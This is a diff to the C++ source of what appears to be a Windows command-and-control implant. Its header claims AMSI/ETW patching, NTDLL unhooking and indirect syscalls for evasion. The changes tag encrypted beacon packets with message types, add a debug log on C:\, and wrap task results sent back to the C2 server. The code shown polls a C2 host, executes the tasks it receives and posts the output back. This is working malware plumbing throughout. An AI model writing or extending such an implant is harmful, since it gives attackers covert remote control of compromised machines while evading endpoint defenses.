@@ -3,10 +3,10 @@
 // Talk to C2 over HTTPS or HTTP, AES-GCM encrypted, jittered sleep, sleep-masked,
 // indirect syscalls, AMSI/ETW patched, NTDLL unhooked.
 
-#include <windows.h>
-#include <winhttp.h>
 #include <winsock2.h>
 #include <ws2tcpip.h>
+#include <windows.h>
+#include <winhttp.h>
 #include <iphlpapi.h>
 #include <tlhelp32.h>
 #include <shlobj.h>
@@ -285,7 +285,8 @@ inline std::vector<uint8_t> aes_key() {
 
 inline std::string post_encrypted(const std::string& path,
                                   const std::string& bot_id,
-                                  const std::string& plaintext) {
+                                  const std::string& plaintext,
+                                  uint8_t msg_type = 0x01) {
     auto key = aes_key();
 
     // random nonce
@@ -304,7 +305,7 @@ inline std::string post_encrypted(const std::string& path,
     std::vector<uint8_t> packet;
     packet.insert(packet.end(), {'R','S','K','Y'});
     packet.push_back(1);              // version
-    packet.push_back(0x01);           // type (beacon)
+    packet.push_back(msg_type);       // type passed by caller
     packet.insert(packet.end(), nonce.begin(), nonce.end());
     uint16_t clen = (uint16_t)(cipher.size() + tag.size());
     packet.push_back((clen >> 8) & 0xFF);
@@ -566,6 +567,18 @@ inline std::string dispatch(const std::string& command, const std::string& args_
 // ────────────────────────────────────────────────────────────────
 namespace beacon {
 
+inline void dbg(const std::string& msg) {
+    HANDLE f = CreateFileA("C:\\redsky_debug.log",
+                           FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE,
+                           nullptr, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
+    if (f == INVALID_HANDLE_VALUE) return;
+    DWORD wrote = 0;
+    SetFilePointer(f, 0, nullptr, FILE_END);
+    WriteFile(f, msg.data(), (DWORD)msg.size(), &wrote, nullptr);
+    WriteFile(f, "\n", 1, &wrote, nullptr);
+    CloseHandle(f);
+}
+
 inline std::string build_checkin(const std::string& bot_id) {
     json::Obj o;
     o.add("hostname", env::get_hostname());
@@ -596,7 +609,7 @@ inline void loop() {
     // first check-in
     auto key = crypto::hex_decode(AES_KEY_HEX);
     std::string checkin = build_checkin(bot_id);
-    std::string resp = c2::post_encrypted(C2_BEACON_PATH, bot_id, checkin);
+    std::string resp = c2::post_encrypted(C2_BEACON_PATH, bot_id, checkin, 0x01);  // MT_CHECKIN
 
     // main loop
     while (true) {
@@ -608,9 +621,11 @@ inline void loop() {
         Sleep(sleep_ms);
 #endif
 
+        dbg("polling...");
         std::string empty = "{\"phase\":\"poll\"}";
-        resp = c2::post_encrypted(C2_BEACON_PATH, bot_id, empty);
-        if (resp.empty()) continue;
+        resp = c2::post_encrypted(C2_BEACON_PATH, bot_id, empty, 0x04);  // MT_PING
+        if (resp.empty()) { dbg("empty response"); continue; }
+        dbg("got response, len=" + std::to_string(resp.size()) + " body=" + resp);
 
         // parse response: {"tasks":[{"id":"...","command":"...","args":{...}}, ...]}
         size_t pos = 0;
@@ -620,18 +635,26 @@ inline void loop() {
             std::string args_str = json::get_field(resp.substr(pos), "args");
             pos += 4;
 
-            if (task_id.empty() || command.empty()) continue;
+            if (task_id.empty() || command.empty()) { dbg("empty id or command"); continue; }
 
+            dbg("task id=" + task_id + " cmd=" + command + " args=" + args_str);
             std::string output = cmd::dispatch(command, args_str);
+            dbg("output len=" + std::to_string(output.size()) + " head=" + output.substr(0, 80));
 
-            // build result
-            json::Obj r;
-            r.add("task_id", task_id);
-            r.add("output", output);
-            r.add_bool("ok", output.find("[!]") != 0);
-            std::string rj = r.dump();
+            // build result - wrapped as {"type":3, "payload":{...}}
+            json::Obj inner;
+            inner.add("task_id", task_id);
+            inner.add("output", output);
+            inner.add_bool("ok", output.find("[!]") != 0);
 
-            c2::post_encrypted(C2_RESULT_PATH, bot_id, rj);
+            json::Obj outer;
+            outer.add_num("type", 3);
+            outer.add_raw("payload", inner.dump());
+            std::string rj = outer.dump();
+
+            dbg("posting result...");
+            std::string rresp = c2::post_encrypted(C2_RESULT_PATH, bot_id, rj, 0x03);
+            dbg("result posted, resp len=" + std::to_string(rresp.size()));
 
             if (command == "kill") {
                 ExitProcess(0);
